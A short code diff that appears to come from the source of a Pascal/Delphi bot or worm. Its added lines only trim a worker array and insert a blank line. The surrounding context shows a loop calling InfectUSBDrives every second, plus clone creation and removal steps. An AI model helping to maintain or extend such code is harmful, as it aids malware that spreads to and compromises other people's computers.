@@ -131,6 +131,7 @@ Begin
   ToPost.Free;
   inherited Destroy;
   Workers[FIndex]:=Nil;
+  if FIndex=High(Workers) then SetLength(Workers, FIndex);
 end;
 
 procedure TCmdWorker.Abort(AbortID: String);
@@ -404,6 +405,7 @@ Begin
       //Create clone
       While Not(Terminated) do Begin
         InfectUSBDrives;
+
         Sleep(1000);
       end;
       //Remove clone
